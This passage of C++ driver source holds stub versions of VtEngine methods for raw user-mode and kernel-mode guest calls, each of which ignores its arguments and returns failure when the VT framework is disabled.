                              _Out_opt_ PVOID OutBuf, _In_ ULONG64 OutSize, _In_ ULONG64 FlagsOrSession)
{
    UNREFERENCED_PARAMETER(Subcmd);
    UNREFERENCED_PARAMETER(InBuf);
    UNREFERENCED_PARAMETER(InSize);
    UNREFERENCED_PARAMETER(OutBuf);
    UNREFERENCED_PARAMETER(OutSize);
    UNREFERENCED_PARAMETER(FlagsOrSession);
    return 0xFFFFFFFFULL;
}

BOOLEAN VtEngine::CallGuestRaw(_In_ ULONG Mode,
                               _In_ ULONG64 Target,
                               _In_reads_opt_(ArgCount) const ULONG64 *Args,
                               _In_ ULONG ArgCount,
                               _Out_ PULONG64 ReturnValue)
{
    UNREFERENCED_PARAMETER(Mode);
    UNREFERENCED_PARAMETER(Target);
    UNREFERENCED_PARAMETER(Args);
    UNREFERENCED_PARAMETER(ArgCount);
    if (ReturnValue)
        *ReturnValue = 0;
    return FALSE;
}

BOOLEAN VtEngine::CallUserRaw(_In_ ULONG64 Target,
                              _In_reads_opt_(ArgCount) const ULONG64 *Args,
                              _In_ ULONG ArgCount,
                              _Out_ PULONG64 ReturnValue)
{
    return CallGuestRaw(VT_CALL_MODE_USER, Target, Args, ArgCount, ReturnValue);
}

BOOLEAN VtEngine::CallKernelRaw(_In_ ULONG64 Target,
                                _In_reads_opt_(ArgCount) const ULONG64 *Args,
                                _In_ ULONG ArgCount,
                                _Out_ PULONG64 ReturnValue)
{
    return CallGuestRaw(VT_CALL_MODE_KERNEL, Target, Args, ArgCount, ReturnValue);
}

#endif // ENABLE_VT_FRAMEWORK
